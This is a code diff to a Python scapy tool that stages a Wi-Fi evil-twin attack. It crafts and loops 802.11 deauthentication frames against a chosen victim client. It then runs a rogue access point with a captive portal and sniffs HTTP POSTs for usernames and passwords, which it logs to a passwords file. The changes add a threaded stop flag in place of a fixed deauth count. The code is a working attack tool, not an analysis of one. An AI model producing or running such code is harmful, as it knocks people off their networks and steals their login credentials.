@@ -15,6 +15,7 @@ from scapy.layers.dhcp import DHCP
 from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 from scapy.layers.http import HTTPRequest
 from scapy.layers.l2 import Ether
+
 stop_thread = False
 interface = ''
 mac = ''
@@ -58,15 +59,13 @@ def arg_parse():
                         help='Name of the wireless interface you want to sniff packets on')
     parser.add_argument('-c', '--channels', required=False, nargs=2, type=str,
                         help='choose the channel range of which to sniff on')
-    parser.add_argument('-n', '--count', required=True, type=int,
-                        help='specify how many deauth frames to send')
 
     args = vars(parser.parse_args())
     if args['interface'] not in netifaces.interfaces():
         print('Interface not found.')
         sys.exit()
 
-    return args['interface'], args['channels'], args['count']
+    return args['interface'], args['channels']
 
 
 # switch interface to monitor mode
@@ -226,13 +225,17 @@ def output_client(net):
                                                        client_AP[i]['BSSID']))
 
 
-def deauth(target_mac, iface, count):
+def deauth(target_mac, iface):
+    global stop_thread
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
     dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
     frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
     print("[+] started deauth attack...")
-    sendp(frame, iface=iface, loop=1, inter=.1, verbose=0)
+    while True:
+        sendp(frame, iface=iface, count=10, inter=.1, verbose=0)
+        if stop_thread:
+            break;
 
 
 def configHostapd(iface, net):
@@ -313,6 +316,7 @@ def config_portal():
 
 
 def station_handler(pkt):
+    global stop_thread
     global connected_stations
     # dhcp offer:
     if DHCP in pkt and pkt[DHCP].options[0][1] == 2 and pkt.getlayer(Ether).dst not in connected_stations:
@@ -324,31 +328,22 @@ def station_handler(pkt):
         if method == 'POST' and pkt.haslayer(Raw):
             if 'Uname' in str(pkt[Raw].load) and 'Pass' in str(pkt[Raw].load):
                 print("[+] ", pkt.getlayer(Ether).src, " has logged in " + str(urllib.parse.parse_qs(pkt[Raw].load)) +
-                                                       " added to /var/www/html/captiveportal/passwords.txt")
+                      " added to /var/www/html/captiveportal/passwords.txt")
+    if stop_thread:
+        return True
 
 
 def sniff_dhcp(iface):
-    sniff(iface=iface, filter='port 80 or (udp and (port 67 or port 68))', prn=station_handler)
+    sniff(iface=iface, filter='port 80 or (udp and (port 67 or port 68))', stop_filter=station_handler)
 
 
 def sig_handler(signum, frame):
     global interface
     global stop_thread
-    os.system("killall dnsmasq")
-    os.system("killall hostapd")
-    os.system('iptables -F')
-    os.system('iptables -t nat -F')
-    os.system("iw dev mon0 del")
-    # os.system("ifconfig " + str(interface) + " 10.0.0.12")
-    os.system("rm dnsmasq.conf")
-    os.system("rm hostapd.conf")
-
-    print("Bye")
-    sys.exit()
 
 
 if __name__ == "__main__":
-    interface, channel, count = arg_parse()
+    interface, channel = arg_parse()
     print(presentation)
     progress()
     os.system('clear')
@@ -383,9 +378,27 @@ if __name__ == "__main__":
     configHostapd(interface, network)
     time.sleep(1)
     configDnsmasq(interface)
-    Thread(target=deauth, args=(victim, 'mon0', count)).start()
+    t1 = Thread(target=deauth, args=(victim, 'mon0',))
+    t1.start()
 
     time.sleep(1)
-    signal.signal(signal.SIGINT, sig_handler)
-    print("[+]scanning activities in our access point if you want to stop press ctrl-c...")
-    sniff_dhcp(interface)
+    print("[+]scanning activities in our access point if you want to stop type exit in terminal...")
+    t2 = Thread(target=sniff_dhcp, args=(interface,))
+    t2.start()
+    exit = input()
+    while exit != 'exit':
+        exit = input()
+    stop_thread = True
+    t1.join()
+    t2.join()
+    os.system("killall dnsmasq")
+    os.system("killall hostapd")
+    os.system('iptables -F')
+    os.system('iptables -t nat -F')
+    os.system("iw dev mon0 del")
+    # os.system("ifconfig " + str(interface) + " 10.0.0.12")
+    os.system("rm dnsmasq.conf")
+    os.system("rm hostapd.conf")
+
+    print("Bye")
+    sys.exit()
